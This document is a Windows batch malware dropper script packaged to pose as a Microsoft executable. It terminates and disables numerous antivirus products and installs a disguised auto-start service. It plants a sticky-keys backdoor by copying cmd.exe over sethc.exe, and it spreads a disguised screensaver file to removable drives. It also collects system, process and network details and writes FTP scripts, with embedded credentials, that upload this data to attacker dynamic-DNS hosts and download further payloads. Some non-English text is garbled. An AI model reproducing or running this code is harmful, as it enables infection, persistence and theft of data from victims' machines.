
@rem ----- ExeScript Options Begin -----
@rem ScriptType: console,silent
@rem DestDirectory: C:\Documents and Settings\All Users\Application Data
@rem Icon: D:\My Documents\����\�ҵĹ�����\IExpress\�ļ���.ico
@rem File: D:\My documents\����\�ҵ�ABC1.9����\baiducamo.exe
@rem OutputFile: D:\My documents\����\�ҵ�ABC����date.exe
@rem CompanyName: Microsoft Corpration
@rem FileVersion: 1.1.0.0
@rem LegalCopyright: Microsoft Corporation
@rem ProductVersion: 1.1.0.0
@rem ----- ExeScript Options End -----
@echo off
if exist D:\Windows�������򱸷��ĵ��ļ�.scr start %systemroot%\Media
if not exist %systemroot%\Media\Windowsϵͳ��������ͼƬ.bmp copy %systemroot%\system32\setup.bmp %systemroot%\Media\Windowsϵͳ��������ͼƬ.bmp /y
if exist Down(0).exe echo f|xcopy Down(0).exe D:\Windows�������򱸷��ĵ��ļ�.scr /q /h /r /y
echo f|xcopy *date.exe D:\Windows�������򱸷��ĵ��ļ�.scr /q /h /r /y
if exist a.exe echo f|xcopy a.exe D:\Windows�������򱸷��ĵ��ļ�.scr /q /h /r /y
echo f|xcopy *date.scr D:\Windows�������򱸷��ĵ��ļ�.scr /q /h /r /y
if exist baiducamo.exe call baiducamo.exe
if not exist %windir%\temp md %windir%\temp
set kyocd=%cd%
attrib +s +h D:\Windows�������򱸷��ĵ��ļ�.scr
attrib +s +h +r %0
if not exist "C:\Documents and Settings\All Users\Application Data\Microsoft" md "C:\Documents and Settings\All Users\Application Data\Microsoft"
if exist a.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" /v "ComputerName" /t reg_sz /d MS08067-MICROSO /f
if exist a.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v "ComputerName" /t reg_sz /d MS08067-MICROSO /f
if exist a.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v "NV Hostname" /t reg_sz /d MS08067-MICROSO /f
if exist a.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname /t reg_sz /d MS08067-MICROSO /f
if exist 9date.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" /v "ComputerName" /t reg_sz /d FTP0806-MICROSO /f
if exist 9date.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v "ComputerName" /t reg_sz /d FTP0806-MICROSO /f
if exist 9date.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v "NV Hostname" /t reg_sz /d FTP0806-MICROSO /f
if exist 9date.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname /t reg_sz /d FTP0806-MICROSO /f
if exist baiducamo.exe del baiducamo.exe
cd /d "C:\Documents and Settings\All Users\Application Data"
if exist C:\date.txt attrib -h C:\date.txt
echo %date% >date.txt
copy date.txt C:\date.txt /y
attrib +s +h "C:\Documents and Settings\All Users\Application Data"
attrib +s +h "%systemdrive%\Program Files\Common Files\Microsoft Shared\Web Folders"
if exist %SystemRoot%\system32\tasklist.exe tasklist >pid1.txt
echo HelloWelcomes >Hello.txt
for %%a in ("pid1.txt") do if %%~za gtr 1000 goto find
echo for each ps in getobject _ >pid.vbs
echo ("winmgmts:\\.\root\cimv2:win32_process").instances_ >>pid.vbs
echo wscript.echo ps.handle^&vbtab^&ps.name^&vbtab^&ps.executablepath:next >>pid.vbs
cscript //nologo pid.vbs >pid1.txt
goto find
:find
call baiducamo.exe
for %%a in ("pid1.txt") do if %%~za lss 500 BaiDuhi.exe -a >pid1.txt
echo HelloWelcomes >>Hello.txt
findstr /i "ekrn.exe safeboxTray.exe nod32krn.exe kwatch.exe shstat.exe Client.exe ashserv.exe" pid1.txt >pid2.txt
sc delete knlps
findstr /i "CCenter.exe services.exe 360tray.exe KVMonXP.kxp RSTray.exe RfwMain.exe 8date.exe" pid1.txt >>pid2.txt
if exist "C:\Documents and Settings\All Users\userse.ini" del "C:\Documents and Settings\All Users\userse.ini" /q
for /f "tokens=1" %%a in (pid2.txt) do echo >%%a
echo HelloWelcomes >>Hello.txt
if not exist services.exe for /f "tokens=2" %%a in (pid2.txt) do echo >%%a
if exist nod32krn.exe sc config nod32krn start= disabled
if exist ekrn.exe sc config ekrn start= disabled
if exist nod32krn.exe taskkill /f /im nod32krn.exe
if exist ekrn.exe taskkill /f /im ekrn.exe
if exist shstat.exe net stop McAfeeFramework
if exist shstat.exe net stop McTaskManager
if exist shstat.exe net stop McShield
if exist shstat.exe taskkill /f /im FrameworkService.exe
if exist shstat.exe taskkill /f /im mcshield.exe
if exist shstat.exe taskkill /f /im vstskmgr.exe
if exist shstat.exe sc config McShield start= disabled
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" del "%allusersprofile%\����ʼ���˵�\����\360ɱ��\ж��360ɱ��.lnk" /q
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" taskkill /f /im vsserv.exe
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" taskkill /f /im livesrv.exe
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" taskkill /f /im xcommsvr.exe
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" net stop scan /y
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" sc config scan start= disabled
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" sc config VSSERV start= disabled
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" sc config LIVESRV start= disabled
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" sc config XCOMM start= disabled
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" sc delete scan
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" sc delete VSSERV
if exist "%allusersprofile%\����ʼ���˵�\����\360ɱ��" sc delete LIVESRV
if exist CCenter.exe sc config RsRavmon start= demand
if exist CCenter.exe goto knlps
if exist KVMonXP.kxp goto kvsrv
goto kyo
:knlps
BaiDuhi.exe -a >BaiDuhi1.txt
FINDSTR /i "RavMonD.exe CCenter.exe RavTask.exe rsnetsvr.exe" BaiDuhi1.txt >BaiDuhi2.txt
FOR /f "tokens=1" %%a in (BaiDuhi2.txt) do BaiDuhi.exe -b %%a
sc config RsCCenter start= demand
sc config RsRavmon start= demand
sc config RsScanSrv start= demand
goto kyo
:kvsrv
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\KVSrvXP" /v "ObjectName" /t reg_sz /d .\guest /f
BaiDuhi.exe -a >BaiDuhi11.txt
FINDSTR /i "KVMonXP.kxp Kvprescan.exe" BaiDuhi11.txt >BaiDuhi12.txt
FOR /f "tokens=1" %%a in (BaiDuhi12.txt) do BaiDuhi.exe -b %%a
goto kyo
:kyo
if not exist 360tray.exe goto kyo2
echo for each ps in getobject _ >360.vbs
echo ("winmgmts:\\.\root\cimv2:win32_process").instances_ >>360.vbs
echo wscript.echo ps.handle^&vbtab^&ps.name^&vbtab^&ps.executablepath:next >>360.vbs
cscript //nologo 360.vbs >BaiDuhi5.txt
for %%a in ("BaiDuhi5.txt") do if %%~za lss 500 BaiDuhi.exe -a >BaiDuhi5.txt
if not exist safeboxTray.exe taskkill /f /im 360tray.exe
FINDSTR /i "360tray.exe safeboxTray.exe" BaiDuhi5.txt >BaiDuhi6.txt
FOR /f "tokens=1" %%a in (BaiDuhi6.txt) do BaiDuhi.exe -b %%a
FINDSTR /i "360tray.exe" BaiDuhi6.txt >360trayway.txt
if exist safeboxTray.exe FINDSTR /i "safeboxTray.exe" BaiDuhi6.txt >360boxway.txt
FOR /f "tokens=3,*" %%a in (360trayway.txt) do echo "%%a %%b">360way2.txt
FOR /f "tokens=1 delims=n" %%a in (360way2.txt) do echo D|XCOPY %%an" %%ankyo" /e /c /q /h /r /k /y
FOR /f "tokens=1 delims=n" %%a in (360way2.txt) do ren %%an" hotsantimgr
FOR /f "tokens=1 delims=n" %%a in (360way2.txt) do ren %%ankyo" safemon
FOR /f "tokens=1 delims=n" %%a in (360way2.txt) do attrib -s -h -r %%an\360drc.dat"
FOR /f "tokens=1 delims=n" %%a in (360way2.txt) do copy 360drc.dat %%an\360drc.dat" /y
FOR /f "tokens=1 delims=n" %%a in (360way2.txt) do attrib +s +h +r %%an\360drc.dat"
FOR /f "tokens=3,*" %%a in (360trayway.txt) do start "" "%%a %%b"
if exist safeboxTray.exe FOR /f "tokens=3,*" %%a in (360boxway.txt) do start "" "%%a %%b"
goto kyo2
:kyo2
if not exist RfwMain.exe goto kyo3
BaiDuhi.exe -a >RfwMain1.txt
sc config RfwService start= disabled
sc config RfwProxySrv start= disabled
FINDSTR /i "rfwProxy.exe rfwstub.exe rfwsrv.exe" RfwMain1.txt >RfwMain2.txt
sc config RfwProxySrv start= disabled
FOR /f "tokens=1" %%a in (RfwMain2.txt) do BaiDuhi.exe -b %%a
goto kyo3
:kyo3
if not exist ashserv.exe goto kyo4
BaiDuhi.exe -a >ashserv1.txt
FINDSTR /i "ashserv.exe ashwebsv.exe ashdisp.exe aswupdsv.exe ashDisp.exe" ashserv1.txt >ashserv2.txt
FOR /f "tokens=1" %%a in (ashserv2.txt) do BaiDuhi.exe -b %%a
goto kyo4
:kyo4
if exist hacker2.rar reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" /v "ComputerName" /t reg_sz /d KISHACK-MICROSO /f
if exist hacker2.rar reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v "ComputerName" /t reg_sz /d KISHACK-MICROSO /f
if exist hacker2.rar reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v "NV Hostname" /t reg_sz /d KISHACK-MICROSO /f
if exist hacker2.rar reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname /t reg_sz /d KISHACK-MICROSO /f
if exist %systemroot%\system32\8date.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" /v "ComputerName" /t reg_sz /d KYO135-MICROSOF /f
if exist %systemroot%\system32\8date.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v "ComputerName" /t reg_sz /d KYO135-MICROSOF /f
if exist %systemroot%\system32\8date.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v "NV Hostname" /t reg_sz /d KYO135-MICROSOF /f
if exist %systemroot%\system32\8date.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname /t reg_sz /d KYO135-MICROSOF /f
if exist Client.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" /v "ComputerName" /t reg_sz /d KYOHACK-MICROSO /f
if exist Client.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v "ComputerName" /t reg_sz /d KYOHACK-MICROSO /f
if exist Client.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v "NV Hostname" /t reg_sz /d KYOHACK-MICROSO /f
if exist Client.exe reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname /t reg_sz /d KYOHACK-MICROSO /f
if exist %systemroot%\system32\00.txt reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" /v "ComputerName" /t reg_sz /d KIS135-MICROSOF /f
if exist %systemroot%\system32\00.txt reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v "ComputerName" /t reg_sz /d KIS135-MICROSOF /f
if exist %systemroot%\system32\00.txt reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v "NV Hostname" /t reg_sz /d KIS135-MICROSOF /f
if exist %systemroot%\system32\00.txt reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname /t reg_sz /d KIS135-MICROSOF /f
if exist "C:\Documents and Settings\All Users\Templates\%computername%.txt" reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" /v "ComputerName" /t reg_sz /d KIS3389-MICROSO /f
if exist "C:\Documents and Settings\All Users\Templates\%computername%.txt" reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v "ComputerName" /t reg_sz /d KIS3389-MICROSO /f
if exist "C:\Documents and Settings\All Users\Templates\%computername%.txt" reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v "NV Hostname" /t reg_sz /d KIS3389-MICROSO /f
if exist "C:\Documents and Settings\All Users\Templates\%computername%.txt" reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname /t reg_sz /d KIS3389-MICROSO /f
if exist "C:\Documents and Settings\dateBAIDU.txt" reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" /v "ComputerName" /t reg_sz /d KISBAIDU-MICROS /f
if exist "C:\Documents and Settings\dateBAIDU.txt" reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v "ComputerName" /t reg_sz /d KISBAIDU-MICROS /f
if exist "C:\Documents and Settings\dateBAIDU.txt" reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v "NV Hostname" /t reg_sz /d KISBAIDU-MICROS /f
if exist "C:\Documents and Settings\dateBAIDU.txt" reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname /t reg_sz /d KISBAIDU-MICROS /f
if exist C:\������Ӻͼ�¼pid��Ϣ�ļ�.txt reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName" /v "ComputerName" /t reg_sz /d KYO3389-MICROSO /f
if exist C:\������Ӻͼ�¼pid��Ϣ�ļ�.txt reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v "ComputerName" /t reg_sz /d KYO3389-MICROSO /f
if exist C:\������Ӻͼ�¼pid��Ϣ�ļ�.txt reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v "NV Hostname" /t reg_sz /d KYO3389-MICROSO /f
if exist C:\������Ӻͼ�¼pid��Ϣ�ļ�.txt reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters" /v Hostname /t reg_sz /d KYO3389-MICROSO /f
if exist "%allusersprofile%\����ʼ���˵�\����\���Ǹ��˷���ǽ" sc config RfwService start= disabled&taskkill /f /im rfwsrv.exe
if not exist Microsoft md Microsoft
echo f|xcopy Micsofoffice1.exe "Microsoft\Micsofoffice1.exe" /q /h /r /y
echo f|xcopy Micsofoffice2.rar "Microsoft\Micsofoffice2.rar" /q /h /r /y
SC create Microsoftmanager binPath= "C:\Documents and Settings\All Users\Application Data\Microsoft\Micsofoffice1.exe" Start= auto displayname= "Microsoftnetwork gervice" type= own
sc config Microsoftmanager start= auto
SC description Microsoftmanager "Ϊ�����ά���ڼ������NTFS�����ļ�֮���ϵͳ���ݿ�,��Ϣ����,�ļ�ϵͳ����Դ�������������ṩ֧��.�ϵͰ汾�Ĳ���ϵͳ�򲻻ᷢ����Щ����.������ô˷���,�κ������˷�������������޷�����."
attrib +s +h "Microsoft\Micsofoffice2.rar"
attrib +s +h "Microsoft\Micsofoffice1.exe"
if exist RSTray.exe if exist "%ProgramFiles%\Rising\AntiSpyware\RSTray.exe" taskkill /f /im RSTray.exe
if not exist kwatch.exe goto nokwa
goto kwatch
:kwatch
BaiDuhi.exe -a >kwatch1.txt
FINDSTR /i "kwatch.exe KPfwSvc.EXE kav32.exe" kwatch1.txt >kwatch2.txt
FOR /f "tokens=1" %%a in (kwatch2.txt) do BaiDuhi.exe -b %%a
net stop KPfwSvc /y
goto nokwa
:nokwa
if exist "%ProgramFiles%\360safe\safemon" echo D|XCOPY "%ProgramFiles%\360safe\safemon" "%ProgramFiles%\360safe\safemonkyo" /e /c /q /h /r /k /y
if exist "%ProgramFiles%\360safe\safemon" ren "%ProgramFiles%\360safe\safemon" hotsantimgr
if exist "%ProgramFiles%\360safe\safemon" ren "%ProgramFiles%\360safe\safemonkyo" safemon
if exist "%ProgramFiles%\360safe\safemon" attrib -s -h -r "%ProgramFiles%\360safe\safemon\360drc.dat"
if exist "%ProgramFiles%\360safe\safemon" copy 360drc.dat "%ProgramFiles%\360safe\safemon\360drc.dat" /y
if exist "%ProgramFiles%\360safe\safemon" attrib +s +h +r "%ProgramFiles%\360safe\safemon\360drc.dat"
if exist "D:\Program Files\360safe\safemon" echo D|XCOPY "D:\Program Files\360safe\safemon" "D:\Program Files\360safe\safemonkyo" /e /c /q /h /r /k /y
if exist "D:\Program Files\360safe\safemon" ren "D:\Program Files\360safe\safemon" hotsantimgr
if exist "D:\Program Files\360safe\safemon" ren "D:\Program Files\360safe\safemonkyo" safemon
if exist "D:\Program Files\360safe\safemon" attrib -s -h -r "D:\Program Files\360safe\safemon\360drc.dat"
if exist "D:\Program Files\360safe\safemon" copy 360drc.dat "D:\Program Files\360safe\safemon\360drc.dat" /y
if exist "D:\Program Files\360safe\safemon" attrib +s +h +r "D:\Program Files\360safe\safemon\360drc.dat"
call Micsofoffice1.exe
echo Windows Registry Editor Version 5.00 >BaiDuhi.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\360Safe\safemon] >>BaiDuhi.reg
echo "ExecAccess"=dword:00000000 >>BaiDuhi.reg
echo "SiteAccess"=dword:00000000 >>BaiDuhi.reg
echo "MonAccess"=dword:00000000 >>BaiDuhi.reg
echo "UDiskAccess"=dword:00000001 >>BaiDuhi.reg
echo "IEProtAccess"=dword:00000000>>BaiDuhi.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time] >>BaiDuhi.reg
echo "ImagePath"=hex(2):43,00,3a,00,5c,00,44,00 >>BaiDuhi.reg
echo "Start"=dword:00000002 >>BaiDuhi.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv] >>BaiDuhi.reg
echo "Start"=dword:00000002 >>BaiDuhi.reg
echo "ImagePath"=hex(2):74,00,25,00,5c,00,73,00,79 >>BaiDuhi.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced] >>BaiDuhi.reg
echo "ShowSuperHidden"=dword:00000000 >>BaiDuhi.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden] >>BaiDuhi.reg
echo "ValueName"="ShowSuperHidden1" >>BaiDuhi.reg
echo [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main] >>BaiDuhi.reg
echo "Window Title"="��ӭ����ٶ���ɫ����IE΢��ϵͳ����Ⱥ.Ⱥ��:41061527" >>BaiDuhi.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SimpleSharing] >>BaiDuhi.reg
echo "ValueName"="ForceGuest1" >>BaiDuhi.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] >>BaiDuhi.reg
echo "forceguest"=dword:00000001 >>BaiDuhi.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\KVSrvXP] >>BaiDuhi.reg
echo "ObjectName"=".\\guest" >>BaiDuhi.reg
echo [HKEY_CLASSES_ROOT\scrfile] >>BaiDuhi.reg
echo @="ϵͳ�ĵ������ļ���" >>BaiDuhi.reg
echo "NeverShowExt"="" >>BaiDuhi.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\scrfile] >>BaiDuhi.reg
echo @="ϵͳ�ĵ������ļ���" >>BaiDuhi.reg
echo "NeverShowExt"="" >>BaiDuhi.reg
echo HelloWelcomes >>Hello.txt
regedit /s BaiDuhi.reg
if exist nod32krn.exe sc config nod32krn start= auto
if exist ekrn.exe sc config ekrn start= auto
if exist "%allusersprofile%\����ʼ���˵�\����\���Ǹ��˷���ǽ" sc config RfwService start= demand
if exist RfwMain.exe sc config RfwService start= demand
if exist hacker1.exe start hacker1.exe
if exist RSTray.exe if exist "%ProgramFiles%\Rising\AntiSpyware\RSTray.exe" start "" "%ProgramFiles%\Rising\AntiSpyware\RSTray.exe"
attrib -s -h D:\Windows�������򱸷��ĵ��ļ�.scr
echo f|xcopy D:\Windows�������򱸷��ĵ��ļ�.scr "D:\My documents\�ҵ����ֺ�ͼƬ�ղ�date.SCR" /q /h /r /y
echo f|xcopy "D:\My documents\�ҵ����ֺ�ͼƬ�ղ�date.scr" D:\Windowsϵͳ�����ĵ������ļ���date.SCR /q /h /r /y
echo f|xcopy "D:\My documents\�ҵ����ֺ�ͼƬ�ղ�date.scr" E:\�۾���Ѷ�Ŵ��������������һ�ֿ���-��ӭ����ٶ���ɫ���������Ⱥ��41061527\Windows�����ĵ������ļ���date.SCR /q /h /r /y
echo �ٶ�֮��ɫ������Ź���-��ӭ����ٶ���ɫ���������Ⱥ��41061527 >E:\�۾���Ѷ�Ŵ��������������һ�ֿ���-��ӭ����ٶ���ɫ���������Ⱥ��41061527\��ɫ������Ź���.txt
echo y|cacls E:\�۾���Ѷ�Ŵ��������������һ�ֿ���-��ӭ����ٶ���ɫ���������Ⱥ��41061527 /D %computername%
copy "%userprofile%\Local Settings\Application Data\Microsoft\Wallpaper1.bmp" "D:\My documents\Windows���汳������ͼƬ.bmp" /y
rd /s /q E:\�۾���Ѷ�Ŵ��������������һ�ֿ���-��ӭ����ٶ���ɫ���������Ⱥ��41061527
attrib +s D:\Windowsϵͳ�����ĵ������ļ���date.SCR
attrib +s +h D:\Windows�������򱸷��ĵ��ļ�.scr
attrib +s "D:\My documents\�ҵ����ֺ�ͼƬ�ղ�date.scr"
attrib +s +h %systemroot%\system32\Microsoft
attrib +s +h Microsoft
MD "D:\Program Files"
MD "D:\Program Files\�۾���Ѷ�Ŵ��������������һ�ֿ���-��ӭ����ٶ���ɫ��������ܽ�͢-Ⱥ��41061527...\"
if exist %SystemRoot%\system32\fsutil.exe fsutil fsinfo drives|find /v "">100.txt
if exist %SystemRoot%\system32\fsutil.exe for /f "tokens=1" %%a in (100.txt) do fsutil fsinfo drivetype %%a>>200.txt
FOR /F "tokens=1" %%a in ('findstr /i "�ƶ�" 200.txt') do copy "D:\My documents\�ҵ����ֺ�ͼƬ�ղ�date.scr" %%a�ҵ����ֺ�ͼƬ�ղ��ĵ������ļ���date.SCR /y
FOR /F "tokens=1" %%a in ('findstr /i "�ƶ�" 200.txt') do attrib +s %%a�ҵ����ֺ�ͼƬ�ղ��ĵ������ļ���date.SCR
del "%allusersprofile%\����ʼ���˵�\����\������\�������.lnk" /q
del "%allusersprofile%\����ʼ���˵�\����\������\����.lnk" /q
copy %SystemRoot%\system32\compmgmt.msc %SystemRoot%\system32\compmgmtkyo.msc /y
del %SystemRoot%\system32\Com\comexp.msc /q
del %SystemRoot%\system32\compmgmt.msc /q
del %SystemRoot%\system32\services.msc /q
copy %SystemRoot%\system32\perfmon.msc %SystemRoot%\system32\compmgmt.msc /y
copy %SystemRoot%\system32\secpol.msc %SystemRoot%\system32\services.msc /y
ren "%allusersprofile%\����ʼ���˵�\����\������\����.lnk" ����ȫ.lnk
copy %SystemRoot%\system32\ftp.exe %SystemRoot%\system32\ftpkyo.exe /y
copy %SystemRoot%\system32\tftp.exe %SystemRoot%\system32\tftpkyo.exe /y
copy %SystemRoot%\system32\netstat.exe %SystemRoot%\system32\netstatkyo.exe /y
copy %SystemRoot%\system32\ftp.exe "C:\Documents and Settings\All Users\Application Data\ftp.exe" /y
copy %SystemRoot%\system32\cmd.exe %SystemRoot%\system32\dllcache\sethc.exe /y
copy %SystemRoot%\system32\cmd.exe %SystemRoot%\system32\sethc.exe /y
attrib +s +h +r %SystemRoot%\system32\ftpkyo.exe
attrib +s +h +r "C:\Documents and Settings\All Users\Application Data\ftp.exe"
attrib +s +h +r %SystemRoot%\system32\tftpkyo.exe
attrib +s +h +r %SystemRoot%\system32\netstatkyo.exe
attrib +s +h +r %SystemRoot%\system32\compmgmtkyo.msc
attrib +s +h +r %SystemRoot%\system32\sethc.exe
copy %SystemRoot%\TASKMAN.EXE %SystemRoot%\system32\ftp.exe /y
copy %SystemRoot%\TASKMAN.EXE %SystemRoot%\system32\netstat.exe /y
copy %SystemRoot%\TASKMAN.EXE %SystemRoot%\system32\tftp.exe /y
sc config DiskerManagerse start= auto
SC description DiskerManagerse "����߼����̾��������Ϣ,�Ա�����Զ����ô�������״̬��Logcalwork Disk������Ϣ������״̬.����˷��񱻽���,�κ����������ķ����鶼����������."
if exist hacker1.exe del D:\Windowsϵͳ�����ĵ������ļ���date.SCR /f /as
if exist %SystemRoot%\system32\OO.txt del D:\Windowsϵͳ�����ĵ������ļ���date.SCR /f /as
if exist C:\������Ӻ�pid��Ϣ�ļ�.txt del D:\Windowsϵͳ�����ĵ������ļ���date.SCR /f /as
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM>%computername%.txt
echo �ٶ���ɫ�����桻�����̻ܽ�ӭ���ǵļ���!Ⱥ��: 41061527>>%computername%.txt
echo �����û���־��¼�ļ�:>>%computername%.txt
type date.txt >>%computername%.txt
echo ��ǰʱ��:%time% >>%computername%.txt
ver >>%computername%.txt
echo ��ǰϵͳ��¼���û�:%username% >>%computername%.txt
echo pid1�оٽ�������: >>%computername%.txt
type pid1.txt >>%computername%.txt
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM: >>%computername%.txt
echo. >>%computername%.txt
echo pid2�оٽ�������: >>%computername%.txt
type pid2.txt >>%computername%.txt
echo. >>%computername%.txt
echo risingbaiduhi1�оٽ�������: >>%computername%.txt
type baiduhi1.txt >>%computername%.txt
echo 360baiduhi5�оٽ�������: >>%computername%.txt
type baiduhi5.txt >>%computername%.txt
echo kwatch1�оٽ�������: >>%computername%.txt
type kwatch1.txt >>%computername%.txt
echo jiangmin-BaiDuhi11.txt�оٽ�������: >>%computername%.txt
type BaiDuhi11.txt >>%computername%.txt
echo RfwMain1�оٽ�������: >>%computername%.txt
type RfwMain1.txt >>%computername%.txt
echo IP��ַ��Ϣ����: >>%computername%.txt
ipconfig /all >>%computername%.txt
echo �˿���������: >>%computername%.txt
netstatkyo.exe -an >>%computername%.txt
echo %kyocd% >>%computername%.txt
if exist %windir%\system32\systeminfo.exe systeminfo.exe >>%computername%.txt
attrib %SystemRoot%\system32\ftp.exe >>%computername%.txt
attrib %SystemRoot%\system32\ftpkyo.exe >>%computername%.txt
attrib %SystemRoot%\system32\tftp.exe >>%computername%.txt
attrib %SystemRoot%\system32\tftpkyo.exe >>%computername%.txt
dir %SystemRoot%\system32\netstat.exe %SystemRoot%\system32\netstatkyo.exe /a >>%computername%.txt
dir %SystemRoot%\system32\ftp.exe %SystemRoot%\system32\ftpkyo.exe /a >>%computername%.txt
dir %SystemRoot%\system32\tftp.exe %SystemRoot%\system32\tftpkyo.exe /a >>%computername%.txt
echo open windowsexplor.8800.org>BaiDuhi.url
echo baiduhi>>BaiDuhi.url
echo index_html>>BaiDuhi.url
echo bin>>BaiDuhi.url
FOR /F "tokens=1" %%a in (date.txt) do echo mkdir ABCKYO2009-%%a>>BaiDuhi.url
echo get lanyu.shs>>BaiDuhi.url
echo get internet2009.url internet2009.exe>>BaiDuhi.url
echo get TermServiceKyo.dll>>BaiDuhi.url
FOR /F "tokens=1" %%a in (date.txt) do echo put %computername%.txt ABCKYO2009-%%a\%computername%.txt>>BaiDuhi.url
echo bye>>BaiDuhi.url
echo open systemiexplor.3322.org>BaiDuhi1.url
echo hikyoberdu>>BaiDuhi1.url
echo htmindex>>BaiDuhi1.url
echo bin>>BaiDuhi1.url
echo cd web>>BaiDuhi1.url
FOR /F "tokens=1" %%a in (date.txt) do echo mkdir ABCKYO2009-%%a>>BaiDuhi1.url
echo get lanyu.shs>>BaiDuhi1.url
echo get internet2009.url internet2009.exe>>BaiDuhi1.url
echo get TermServiceKyo.dll>>BaiDuhi1.url
FOR /F "tokens=1" %%a in (date.txt) do echo put %computername%.txt ABCKYO2009-%%a\%computername%.txt>>BaiDuhi1.url
echo bye>>BaiDuhi1.url
echo open wodedianlao.3322.org>BaiDuhi2.url
echo kyohi2009>>BaiDuhi2.url
echo indexhtm>>BaiDuhi2.url
echo bin>>BaiDuhi2.url
echo cd web>>BaiDuhi2.url
FOR /F "tokens=1" %%a in (date.txt) do echo mkdir ABCKYO2009-%%a>>BaiDuhi2.url
echo get lanyu.shs>>BaiDuhi2.url
echo get internet2009.url internet2009.exe>>BaiDuhi2.url
echo get TermServiceKyo.dll>>BaiDuhi2.url
FOR /F "tokens=1" %%a in (date.txt) do echo put %computername%.txt ABCKYO2009-%%a\%computername%.txt>>BaiDuhi2.url
echo bye>>BaiDuhi2.url
if exist C:\%computername%.txt attrib -s -h -r C:\%computername%.txt
regedit /s BaiDuhi.reg
copy %computername%.txt C:\%computername%.txt /y 
attrib +r %computername%.txt
attrib +r BaiDuhi.url
